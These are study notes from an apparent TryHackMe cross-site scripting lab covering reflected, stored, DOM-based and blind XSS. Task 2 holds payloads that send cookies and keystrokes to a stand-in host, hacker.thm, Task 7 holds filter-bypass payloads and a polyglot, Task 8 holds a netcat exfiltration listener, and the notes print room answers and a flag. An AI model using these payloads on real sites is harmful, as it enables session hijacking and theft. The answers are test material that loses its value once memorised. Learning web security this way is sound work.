---
{"dg-publish":true,"permalink":"/thm-notes/web-fundamentals-path/xss/","title":"Intro to Cross Site Scripting","tags":["web"]}
---

## Notes on XSS and Exploiting Cross-Site Scripting Vulnerabilities

## TASK 1 - Room Brief
### Prerequisites
- Basic understanding of JavaScript
- Understanding of Client-Server requests and responses

### Introduction to XSS
- XSS (Cross-Site Scripting): An injection attack where malicious JavaScript is injected into a web application to be executed by other users.
- Types of XSS:
  - Reflected XSS
  - Stored XSS
  - DOM-Based XSS
- Real-world examples of XSS vulnerabilities found in major applications: Shopify, Steam chat, HackerOne, Infogram.

**Questions:**
1. What does XSS stand for?
   - Answer: `Cross-site scripting`

## TASK 2 - XSS Payloads
### What is a Payload?
- The JavaScript code intended to be executed on the target's computer.
- Two parts: intention and modification.

### Examples of XSS Intentions
1. **Proof of Concept:**
   - Example: `<script>alert('XSS');</script>`
2. **Session Stealing:**
   - Example: `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`
3. **Key Logger:**
   - Example: `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
4. **Business Logic:**
   - Example: `<script>user.changeEmail('attacker@hacker.thm');</script>`

**Questions:**
1. Which document property could contain the user's session token?
   - Answer: `document.cookie`
2. Which JavaScript method is often used as a Proof Of Concept?
   - Answer: `alert`

## TASK 3 - Reflected XSS
### Reflected XSS
- Occurs when user-supplied data in an HTTP request is included in the webpage source without validation.

### Example Scenario
- Error message from the URL query string is directly included in the page source without validation.

### Potential Impact
- Attackers can send malicious links to execute code on the victim's browser.

### Testing for Reflected XSS
- Test possible points of entry:
  - URL Query String
  - URL File Path
  - HTTP Headers

**Questions:**
1. Where in an URL is a good place to test for reflected XSS?
   - Answer: `parameters`

## TASK 4 - Stored XSS
### Stored XSS
- The XSS payload is stored on the web application (e.g., in a database) and executed when users visit the affected page.

### Example Scenario
- Comments on a blog that do not filter out malicious JavaScript.

### Potential Impact
- Redirecting users, stealing session cookies, or performing actions as the user.

### Testing for Stored XSS
- Test entry points where data is stored and reflected to other users:
  - Blog comments
  - User profile information
  - Website listings

**Questions:**
1. How are stored XSS payloads usually stored on a website?
   - Answer: `database`

## TASK 5 - DOM Based XSS
### What is the DOM?
- Document Object Model: Represents the page for programs to change the document structure, style, and content.

### DOM Based XSS
- JavaScript execution occurs directly in the browser without loading new pages or submitting data to the backend.

### Example Scenario
- JavaScript reads `window.location.hash` and writes it to the page without validation.

### Potential Impact
- Crafted links can redirect users or steal content from the page.

### Testing for DOM Based XSS
- Look for variables controlled by attackers (e.g., `window.location.x` parameters).
- Check how they are handled and if written to the DOM or passed to unsafe methods like `eval()`.

**Questions:**
1. What unsafe JavaScript method is good to look for in source code?
   - Answer: `eval()`

## TASK 6 - Blind XSS
### Blind XSS
- Similar to Stored XSS, but the attacker cannot see the payload being executed.

### Example Scenario
- Message content in a support form is not checked and is viewed by staff on a private portal.

### Potential Impact
- Extracting staff portal URL, session cookies, or portal contents.

### Testing for Blind XSS
- Ensure the payload has a callback (e.g., HTTP request) to know when the code is executed.
- Use tools like [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express) for automatic capturing.

**Questions:**
1. What tool can you use to test for Blind XSS?
   - Answer: `XSS Hunter Express`
2. What type of XSS is very similar to Blind XSS?
   - Answer: `Stored XSS`

## TASK 7 - Perfecting your Payload
### Crafting Effective Payloads
- Depends on how the JavaScript is reflected in the target website's code.
- Example payload for a simple XSS alert: `<script>alert('THM');</script>`
  
### Testing Levels:
1. **Level One:**
   - Payload: `<script>alert('THM');</script>`
2. **Level Two:**
   - Payload: `"><script>alert('THM');</script>`
3. **Level Three:**
   - Payload: `</textarea><script>alert('THM');</script>`
4. **Level Four:**
   - Payload: `';alert('THM');//`
5. **Level Five:**
   - Payload: `<sscriptcript>alert('THM');</sscriptcript>`
6. **Level Six:**
   - Payload: `/images/cat.jpg" onload="alert('THM');`

### Polyglots:
- A string that can escape attributes, tags, and bypass filters.
- Example: 
  ```javascript
/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
  ```

**Questions:**
1. What is the flag you received from level six?
   - Answer: `THM{XSS_MASTER}`

## TASK 8 - Practical Example (Blind XSS)
### Testing Blind XSS
1. Set up a listening server using Netcat:
   ```bash
   nc -nlvp 9001
   ```
2. Craft payload to extract user's cookies and exfiltrate to the listening server.

### Example of Crafting and Testing Payloads in a Practical Scenario
- Use the payload to test if it gets executed and extract useful information.

These notes cover the essentials of understanding and exploiting XSS vulnerabilities, from basic concepts to practical application and testing strategies.